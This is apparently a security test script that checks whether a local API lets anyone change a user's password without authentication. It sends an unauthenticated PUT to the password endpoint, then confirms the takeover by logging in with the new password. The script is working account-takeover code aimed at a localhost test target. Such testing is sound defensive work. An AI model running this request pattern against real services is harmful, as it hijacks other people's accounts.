#!/usr/bin/env python3
"""
Unauthorized Password Change Test Script
Target: PUT /users/v1/{username}/password and POST /users/v1/login
Base URL: http://localhost:5002

This script tests whether the API allows changing a user's password without proper authentication.
It performs the following steps:
  1. Sends a PUT request to change the password for the user "name1" without any authentication.
  2. Attempts to log in using the new password.
If the login succeeds, this indicates that the password change was accepted without authorization.
"""

import requests

# Configuration
base_url = "http://localhost:5002"
username = "name1"
new_password = "newpass123"

# Step 1: Attempt to change the password without authentication
change_url = f"{base_url}/users/v1/{username}/password"
print(f"Attempting unauthorized password change on URL: {change_url}")

# Payload to update the password
change_payload = {
    "new_password": new_password
}

try:
    change_response = requests.put(change_url, json=change_payload, timeout=10)
    print("Password Change Request - Status Code:", change_response.status_code)
    print("Password Change Response Body:")
    print(change_response.text)
except Exception as e:
    print("Error during password change request:", e)
    exit(1)

# Step 2: Attempt to log in using the new password to verify if the change succeeded
login_url = f"{base_url}/users/v1/login"
print(f"\nAttempting login with new password on URL: {login_url}")

login_payload = {
    "username": username,
    "password": new_password
}

try:
    login_response = requests.post(login_url, json=login_payload, timeout=10)
    print("Login Request - Status Code:", login_response.status_code)
    print("Login Response Body:")
    print(login_response.text)
    
    if login_response.status_code == 200:
        print("\nPotential Unauthorized Password Change vulnerability detected!")
        print("The new password was accepted without proper authentication.")
    else:
        print("\nLogin failed with the new password. The endpoint may be properly secured.")
except Exception as e:
    print("Error during login request:", e)
